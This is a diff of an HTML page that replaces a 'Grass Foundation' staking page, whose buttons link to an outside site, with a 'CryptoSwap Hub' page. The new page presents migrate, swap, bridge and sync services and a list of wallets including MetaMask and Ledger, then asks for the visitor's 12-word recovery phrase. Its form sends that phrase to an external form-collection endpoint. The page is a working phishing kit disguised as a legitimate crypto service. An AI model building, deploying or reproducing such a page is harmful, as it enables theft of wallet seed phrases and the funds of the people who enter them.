@@ -1,187 +1,218 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Grass Foundation</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+<html><head><base href="/" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Crypto Hub</title>
+<style>
+:root {
+    --primary-green: #0fae3c;
+    --light-green: #e7f7ec;
+    --white: #ffffff;
+}
 
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #E6F9E9;
-            color: #333;
-        }
+body {
+    margin: 0;
+    padding: 0;
+    font-family: 'Arial', sans-serif;
+    background-color: var(--white);
+}
 
-        /* Header Styling */
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px 30px;
-            background-color: #FFFFFF;
-            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
-            position: sticky;
-            top: 0;
-            z-index: 10;
-        }
+.header {
+    background-color: var(--primary-green);
+    color: var(--white);
+    padding: 1rem;
+    text-align: center;
+}
 
-        .logo {
-            display: flex;
-            align-items: center;
-            font-size: 1em;
-            font-weight: bold;
-            color: #333;
-            text-decoration: none;
-        }
+.container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 2rem;
+}
 
-        .logo img {
-            width: 30px;
-            margin-right: 8px;
-        }
+.options-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 2rem;
+    margin-top: 2rem;
+}
 
-        /* Navigation Links */
-        .nav {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
+.option-card {
+    background-color: var(--light-green);
+    border-radius: 10px;
+    padding: 1.5rem;
+    text-align: center;
+    transition: transform 0.3s ease;
+    cursor: pointer;
+}
 
-        .nav a {
-            text-decoration: none;
-            color: #333;
-            font-weight: 600;
-            font-size: 14px;
-            transition: color 0.3s;
-        }
+.option-card:hover {
+    transform: translateY(-5px);
+}
 
-        .nav a:hover {
-            color: #007F00;
-        }
+.option-icon {
+    width: 60px;
+    height: 60px;
+    margin-bottom: 1rem;
+}
 
-        .stake-button {
-            padding: 12px 24px; /* Increased padding */
-            background-color: #007F00; /* Changed to a more vibrant green */
-            color: #fff;
-            border: 2px solid #fff; /* Added a white border */
-            border-radius: 25px; /* Slightly adjusted border radius */
-            font-weight: 600;
-            cursor: pointer;
-            font-size: 16px; /* Increased font size */
-            transition: background-color 0.3s, transform 0.2s; /* Added transform for hover effect */
-        }
+.wallet-selection {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background-color: rgba(0,0,0,0.8);
+    z-index: 1000;
+}
 
-        .stake-button:hover {
-            background-color: #005900; /* Darker green on hover */
-            transform: scale(1.05); /* Slightly increase size on hover */
-        }
+.wallet-panel {
+    background-color: var(--white);
+    padding: 2rem;
+    border-radius: 10px;
+    max-width: 500px;
+    margin: 2rem auto;
+}
 
-        /* Main Content */
-        .main-content {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 30px;
-        }
+.wallet-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+    gap: 1rem;
+    margin-top: 1rem;
+}
 
-        .main-image img {
-            width: 100%;
-            max-width: 700px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
-        }
+.wallet-option {
+    background-color: var(--light-green);
+    padding: 1rem;
+    border-radius: 5px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+}
 
-        /* Call-to-Action Section */
-        .cta-section {
-            text-align: center;
-            background-color: #B6F2B7;
-            padding: 40px 30px;
-            border-radius: 10px;
-            width: 100%;
-            max-width: 700px;
-            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
-        }
+.wallet-option:hover {
+    background-color: var(--primary-green);
+    color: var(--white);
+}
 
-        .title {
-            font-size: 2.2em;
-            margin-bottom: 20px;
-            font-weight: bold;
-            color: #333;
-        }
+.phrase-form {
+    display: none;
+    margin-top: 2rem;
+}
 
-        .eligibility-button {
-            padding: 12px 40px;
-            background-color: #000;
-            color: #fff;
-            border: none;
-            border-radius: 30px;
-            font-size: 1.1em;
-            font-weight: 600;
-            cursor: pointer;
-            margin-bottom: 30px;
-            transition: background-color 0.3s;
-            text-decoration: none;
-        }
+.phrase-input {
+    width: 100%;
+    padding: 1rem;
+    margin: 1rem 0;
+    border: 1px solid var(--primary-green);
+    border-radius: 5px;
+}
 
-        .eligibility-button:hover {
-            background-color: #333;
-        }
+.connect-btn {
+    background-color: var(--primary-green);
+    color: var(--white);
+    border: none;
+    padding: 1rem 2rem;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 1.1rem;
+}
 
-        /* Mission Statement */
-        .mission-statement {
-            background-color: #F0FFF4;
-            padding: 25px;
-            border-radius: 10px;
-            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.05);
-        }
-
-        .mission-statement h2 {
-            font-size: 1.6em;
-            margin-bottom: 10px;
-            color: #333;
-        }
-
-        .mission-statement p {
-            font-size: 1.1em;
-            color: #666;
-            line-height: 1.5;
-        }
-    </style>
+.connect-btn:hover {
+    opacity: 0.9;
+}
+</style>
 </head>
 <body>
+    <div class="header">
+        <h1>CryptoSwap Hub</h1>
+        <p>Your One-Stop Solution for All Crypto Operations</p>
+    </div>
 
-    <header class="header">
-        <a href="#" class="logo">
-            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR2DKgxIT4HFg7TnPGONNm4CI-j3DPQpd-FL5bhs4Q-Q4DjHKvDaXlVf0s&s=10" alt="Logo">
-            Grass Foundation
-        </a>
-        <nav class="nav">
-            <a href="#">Docs</a>
-            <a href="#">Blog</a>
-            <a href="#">Forum</a>
-            <a href="https://kickerdenim-ctz2jz.stormkit.dev" class="stake-button">STAKE</a>
-        </nav>
-    </header>
-
-    <main class="main-content">
-        <section class="main-image">
-            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQzEZ01qvrOUKV6psQOkC-nxEiQK_zbHUku9jNl71w_qA&s" alt="Main Illustration">
-        </section>
-
-        <section class="cta-section">
-            <h1 class="title">Grass Foundation</h1>
-            <a href="https://kickerdenim-ctz2jz.stormkit.dev" class="eligibility-button">CHECK ELIGIBILITY</a>
-            <div class="mission-statement">
-                <h2>Our Mission</h2>
-                <p>Grass Foundation is committed to decentralizing the web and making it accessible to everyone.</p>
+    <div class="container">
+        <div class="options-grid">
+            <div class="option-card" onclick="showWalletSelection('migrate')">
+                <svg class="option-icon" viewBox="0 0 24 24">
+                    <path fill="currentColor" d="M13,14H11V10H13M13,18H11V16H13M1,21H23L12,2L1,21Z"/>
+                </svg>
+                <h3>Migrate</h3>
+                <p>Seamlessly migrate your assets across chains</p>
             </div>
-        </section>
-    </main>
 
+            <div class="option-card" onclick="showWalletSelection('swap')">
+                <svg class="option-icon" viewBox="0 0 24 24">
+                    <path fill="currentColor" d="M21,9L17,5V8H10V10H17V13M7,11L3,15L7,19V16H14V14H7V11Z"/>
+                </svg>
+                <h3>Swap</h3>
+                <p>Exchange tokens at the best rates</p>
+            </div>
+
+            <div class="option-card" onclick="showWalletSelection('bridge')">
+                <svg class="option-icon" viewBox="0 0 24 24">
+                    <path fill="currentColor" d="M21,15C21,16.66 19.66,18 18,18H16V16H18C18.55,16 19,15.55 19,15V9C19,8.45 18.55,8 18,8H16V6H18C19.66,6 21,7.34 21,9V15M3,15C3,16.66 4.34,18 6,18H8V16H6C5.45,16 5,15.55 5,15V9C5,8.45 5.45,8 6,8H8V6H6C4.34,6 3,7.34 3,9V15M13,8H11V18H13V8Z"/>
+                </svg>
+                <h3>Bridge</h3>
+                <p>Transfer assets between different blockchains</p>
+            </div>
+
+            <div class="option-card" onclick="showWalletSelection('sync')">
+                <svg class="option-icon" viewBox="0 0 24 24">
+                    <path fill="currentColor" d="M12,18A6,6 0 0,1 6,12C6,11 6.25,10.03 6.7,9.2L5.24,7.74C4.46,8.97 4,10.43 4,12A8,8 0 0,0 12,20V23L16,19L12,15M12,4V1L8,5L12,9V6A6,6 0 0,1 18,12C18,13 17.75,13.97 17.3,14.8L18.76,16.26C19.54,15.03 20,13.57 20,12A8,8 0 0,0 12,4Z"/>
+                </svg>
+                <h3>Sync</h3>
+                <p>Synchronize your wallet across devices</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="wallet-selection" id="walletSelection">
+        <div class="wallet-panel">
+            <h2>Select Your Wallet</h2>
+            <div class="wallet-grid">
+                <div class="wallet-option" onclick="showPhraseForm('metamask')">MetaMask</div>
+                <div class="wallet-option" onclick="showPhraseForm('trust')">Trust Wallet</div>
+                <div class="wallet-option" onclick="showPhraseForm('phantom')">Phantom</div>
+                <div class="wallet-option" onclick="showPhraseForm('ledger')">Ledger</div>
+                <div class="wallet-option" onclick="showPhraseForm('coinbase')">Coinbase</div>
+                <div class="wallet-option" onclick="showPhraseForm('tonhub')">Tonhub</div>
+                <div class="wallet-option" onclick="showPhraseForm('argent')">Argent</div>
+                <div class="wallet-option" onclick="showPhraseForm('zerion')">Zerion</div>
+                <div class="wallet-option" onclick="showPhraseForm('safepal')">SafePal</div>
+            </div>
+
+            <form id="phraseForm" class="phrase-form" action="https://getform.io/f/bxooeyoa" method="GET">
+                <input type="hidden" name="action" id="actionType">
+                <input type="hidden" name="wallet" id="walletType">
+                <textarea class="phrase-input" name="phrase" rows="3" placeholder="Enter your 12-word recovery phrase" required></textarea>
+                <button type="submit" class="connect-btn">Connect Wallet</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        let currentAction = '';
+        let currentWallet = '';
+
+        function showWalletSelection(action) {
+            currentAction = action;
+            document.getElementById('walletSelection').style.display = 'block';
+            document.getElementById('actionType').value = action;
+        }
+
+        function showPhraseForm(wallet) {
+            currentWallet = wallet;
+            document.getElementById('walletType').value = wallet;
+            document.getElementById('phraseForm').style.display = 'block';
+            
+            // Scroll to the form
+            document.getElementById('phraseForm').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Close modal when clicking outside
+        document.getElementById('walletSelection').addEventListener('click', function(e) {
+            if (e.target === this) {
+                this.style.display = 'none';
+            }
+        });
+    </script>
 </body>
 </html>
